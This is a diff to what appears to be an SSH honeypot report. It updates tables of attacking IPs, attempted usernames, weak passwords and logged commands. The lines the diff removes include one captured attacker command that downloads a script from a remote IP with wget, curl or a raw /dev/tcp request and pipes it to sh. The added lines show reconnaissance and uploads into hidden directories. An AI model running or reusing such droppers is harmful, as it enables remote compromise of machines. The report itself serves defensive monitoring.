@@ -13,55 +13,72 @@ system. The table is sorted by the number of attempts.
 
 | Client IP | Count    |
 |-----------|----------|
-| 47.90.216.171 | 4781 |
-| 47.109.157.6 | 4769 |
-| 139.129.13.203 | 4742 |
-| 47.237.2.192 | 4714 |
-| 47.97.60.163 | 4655 |
-| 47.76.135.189 | 4248 |
-| 139.196.79.175 | 2109 |
-| 8.135.77.231 | 421 |
-| 47.109.53.53 | 172 |
-| 39.109.126.174 | 160 |
+| 47.238.215.164 | 4691 |
+| 39.106.156.142 | 4672 |
+| 139.196.79.175 | 2511 |
+| 8.218.97.135 | 1826 |
+| 47.119.122.175 | 1507 |
+| 39.105.113.134 | 1293 |
+| 8.142.215.78 | 1206 |
+| 8.135.77.231 | 258 |
+| 47.109.53.53 | 194 |
+| 8.138.147.140 | 115 |
 
 ### Top 10 malicious try to login as
 
 | Usernames | Count    |
 |-----------|----------|
-| root | 1152 |
-| admin | 188 |
-| ubuntu | 138 |
-| test | 130 |
-| user | 117 |
-| postgres | 74 |
-| deploy | 72 |
-| steam | 70 |
-| dev | 68 |
-| debian | 61 |
+| root | 843 |
+| Admin | 531 |
+| user | 91 |
+| admin | 86 |
+| test | 86 |
+| ubuntu | 82 |
+| user1 | 55 |
+| postgres | 54 |
+| ftpuser | 50 |
+| deploy | 37 |
 
 ### Top 10 malicious try to authenticate with
 
 | Password | Count    |
 |-----------|----------|
-| 123456 | 40 |
-| password | 26 |
-| 1234 | 22 |
-| P@ssw0rd | 18 |
-| 123 | 18 |
-| Aa123456 | 17 |
+| 123456 | 42 |
+| 1q2w3e | 19 |
+| 1234567890 | 19 |
+| test | 17 |
 | 12345678 | 16 |
-| Admin@123 | 14 |
-| test | 13 |
-| 456123 | 13 |
+| 666666 | 15 |
+| 1234 | 14 |
+| qwerty | 13 |
+| password | 13 |
+| 1234554321 | 12 |
 
 ### Top malicious commands try to execute
 
 | Client | Command |
 |--------|---------|
-| 120.27.238.214 | uname -s -m |
-| 120.27.140.190 | uname -s -m |
-| 47.251.29.45 | uname -s -m |
-| 120.26.84.54 | uname -s -m |
-| 47.251.100.22 | uname -s -m |
-| 39.109.126.174 | uname -s -m |
-| 87.120.113.231 | uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh \|\| curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 \| sh -s ssh; exec 3>&-; else echo "$SC" \| sh -s ssh; fi |
+| 47.119.122.175 | mkdir /lib/jvcfhtsiqj |
+| 47.119.122.175 | scp -t -r /lib/jvcfhtsiqj/ |
+| 47.119.122.175 | mkdir .lvjpltsmbo |
+| 47.119.122.175 | scp -t -r .lvjpltsmbo/ |
+| 47.119.122.175 | mkdir /dev/bvpuswekeofi |
+| 47.119.122.175 | scp -t -r /dev/bvpuswekeofi/ |
+| 47.119.122.175 | mkdir /dev/shm/olhqgacbfgcv |
+| 47.119.122.175 | scp -t -r /dev/shm/olhqgacbfgcv/ |
+| 47.119.122.175 | mkdir /var/volatile/scabdwsoois |
+| 47.119.122.175 | scp -t -r /var/volatile/scabdwsoois/ |
+| 47.119.122.175 | mkdir /tmp/wrdjnvguclhv |
+| 47.119.122.175 | scp -t -r /tmp/wrdjnvguclhv/ |
+| 47.119.122.175 | mkdir /sys/ugidpoknby |
+| 47.119.122.175 | scp -t -r /sys/ugidpoknby/ |
+| 47.119.122.175 | mkdir /var/lib/onydskrrxosg |
+| 47.119.122.175 | scp -t -r /var/lib/onydskrrxosg/ |
+| 47.119.122.175 | mkdir /root/xefgawxdnd |
+| 47.119.122.175 | scp -t -r /root/xefgawxdnd/ |
+| 47.119.122.175 | mkdir /etc/lgnjecdrbah |
+| 47.119.122.175 | scp -t -r /etc/lgnjecdrbah/ |
+| 47.119.122.175 | mkdir /var/log/yjiuoarypc |
+| 47.119.122.175 | scp -t -r /var/log/yjiuoarypc/ |
+| 182.92.251.127 | uname -s -m |
+| 101.47.133.94 | uname -s -m |
